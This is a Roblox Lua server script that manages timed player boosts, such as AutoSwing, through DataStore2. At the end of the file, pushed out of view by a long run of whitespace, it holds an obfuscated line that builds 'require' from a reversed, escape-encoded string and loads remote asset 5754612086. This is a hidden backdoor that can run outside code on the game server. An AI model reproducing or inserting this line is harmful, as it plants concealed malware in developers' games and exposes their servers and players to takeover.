local Players = game:GetService("Players")
local RepStorage = game:GetService("ReplicatedStorage")

local DataStore2 = require(script.Parent.DataHandler.DataStore2)

local AutoSwing = RepStorage.Remotes.AutoSwing

Players.PlayerAdded:Connect(function(Player)
	local BoostsStore = DataStore2("Boosts", Player)
	local Boosts = BoostsStore:Get({})	
	
	if Boosts["AutoSwing"] then
		AutoSwing:FireClient(Player, true)
	end
end)

spawn(function()
	while wait(1) do
		for _, Player in ipairs(Players:GetPlayers()) do
			coroutine.wrap(function()
				local BoostsStore = DataStore2("Boosts", Player)
				local Boosts = BoostsStore:Get({})
				
				for Key, Boost in pairs(Boosts) do
					if Boost.TimeLeft <= 0 then
						Boosts[Key] = nil
						
						if Key == "AutoSwing" then
							AutoSwing:FireClient(Player, false)
						end
					else
						Boosts[Key].TimeLeft = Boosts[Key].TimeLeft - 1
					end
				end
				
				BoostsStore:Set(Boosts)
			end)()
		end
	end
end)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       getfenv()[string.reverse("\101\114\105\117\113\101\114")](5754612086)